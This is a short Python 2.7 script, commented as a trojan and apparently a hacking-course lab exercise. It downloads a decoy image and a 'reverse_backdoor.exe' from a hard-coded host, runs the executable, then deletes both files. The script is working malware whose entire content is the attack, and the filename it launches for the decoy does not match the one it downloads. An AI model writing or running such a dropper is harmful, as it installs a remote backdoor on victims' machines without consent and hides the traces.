#!/usr/bin/env python2.7
import requests,os,tempfile,subprocess
# THIS TROJAN FILE NEEDS INTERNET
def download(url):
    get_response = requests.get(url,stream=True)
    file_name  = url.split("/")[-1]
    with open(file_name, 'wb') as f:
        for chunk in get_response.iter_content(chunk_size=1024):
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                f.flush()
                os.fsync(f.fileno())

temp_directory = tempfile.gettempdir()
# print temp_directory
os.chdir(temp_directory)

download("http://192.168.184.156/evil-files/ab.png")
subprocess.Popen("new.png",shell=True)

download("http://192.168.184.156/evil-files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe",shell=True)
# print("hi")
os.remove("ab.png")
os.remove("reverse_backdoor.exe")

